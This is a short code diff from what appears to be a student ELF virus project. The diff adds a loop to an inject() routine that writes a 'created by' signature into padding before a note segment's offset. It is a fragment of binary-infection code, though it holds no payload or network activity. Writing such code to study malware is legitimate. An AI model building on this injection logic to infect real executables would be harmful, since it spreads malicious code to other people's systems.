@@ -6,7 +6,7 @@
 /*   By: ddinaut <ddinaut@student.42.fr>            +#+  +:+       +#+        */
 /*                                                +#+#+#+#+#+   +#+           */
 /*   Created: 2019/03/12 18:20:42 by ddinaut           #+#    #+#             */
-/*   Updated: 2019/04/04 16:11:42 by ddinaut          ###   ########.fr       */
+/*   Updated: 2019/04/04 16:24:12 by ddinaut          ###   ########.fr       */
 /*                                                                            */
 /* ************************************************************************** */
 
@@ -55,6 +55,13 @@ void		inject(t_data *data)
 
 	// step 3 : pad
 	lim = data->virus.note->p_offset;
+
+	for (register int i = 0 ; i < CREATE_SZ ; i++)
+	{
+		*dst++ = CREATED_BY[i];
+		off++;
+	}
+
 	while (off < lim)
 	{
 		*dst++ = 0;
